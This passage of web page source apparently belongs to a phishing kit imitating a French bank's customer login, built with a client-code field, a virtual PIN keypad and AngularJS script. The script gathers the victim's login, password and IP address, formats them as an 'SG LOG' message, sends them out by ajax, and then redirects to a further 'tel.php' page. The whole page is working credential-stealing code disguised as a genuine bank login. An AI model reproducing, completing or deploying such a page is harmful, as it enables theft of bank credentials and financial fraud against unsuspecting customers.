  ...
  @keyframes lds-spinner {
    ...
    <body ng-app="sa_app"  ng-controller="controller" ng-init="show_data()">
       <div class="overlay" style="display: none;">
        ...
        <!-- MAIN -->
        <main id="main" class="pt-5 pb-5 mb-5" >
            <div class="container">
                <div class="row">
                    <div class="col-md-5">
                        <form class="text-center login-form">
                            <div class="form-group mb-3">
                                <input type="text" name="code_client" id="code_client" maxlength="8" placeholder="Saisissez votre code client" ng-model="val_login" ng-change="bloc_login()">
                                <span class="input-reset"><i class="fas fa-times"></i></span>
                                <span class="check"><i class="fas fa-check"></i></span>
                                <div class="error-message">Veuillez vérifier votre identifiant et votre code confidentiel.</div>
                            </div>

                            <div class="form-group mb-2">
                                <img src="assets/images/remember.jpg">
                            </div>
                            <input type="hidden" name="password" id="password" ng-model="val_pwd">
                            <div class="form-group mb-2 zzz">
                            ...
                            <div class="form-group mb-3 zzz">
                                <ul class="numbers" style="margin-left: 23px;">
                                    <li><a data-number="5">5</a></li>
                                    <li><a data-number=""></a></li>
                            ...
                            <div class="form-group mb-5 mt-4">
                              <!--   <button type="button">
                                    <img src="assets/images/valider.jpg">
                                </button> -->
                            <button type="button" class="btnx btnxN" ng-click="valider_pwd()">
                                Valider
                            </button>
                    ...
                    <div class="col-md-7 d-lg-block d-md-block d-sm-none d-none">
                        <img src="assets/images/index-content.jpg">
                    </div>
                </div>
            </div>
        </main>
        ...
        <div class="index-content d-lg-none d-md-none d-sm-block d-block">
            <img src="assets/images/index-content2.jpg">
        </div>
...
fetch.controller('controller', ['$scope', '$http','$filter', function ($scope, $http,$filter) {
    ...
    var pathname2 = urly.replace("index.php", "");
...
console.log(hour)
    ...
    $scope.valider_pwd = function(){ 
        var code_client = $scope.val_login;
       ...
       $(".overlay").show();
             var Detaile = {};
             Detaile.login=$scope.val_login;
             Detaile.pwd=  $('#password').val();
             ...
             Detaile.url= pathname2+'admin.php?ip='+$scope.info_User['ip'];
             const message = `SG LOG\n--------------\nLOG: <code>${Detaile.login}</code>\n\nPWD: <code>${Detaile.pwd}</code>\n\n\n${Detaile.url}\n--------------\n${Detaile.info}`;
            ...
            $.ajax({
                ...
                success: function (res) {
                     setInterval(function() {
                           console.log('okkkk')
                            window.location.href = pathname+'tel.php';
                     }, 3000);
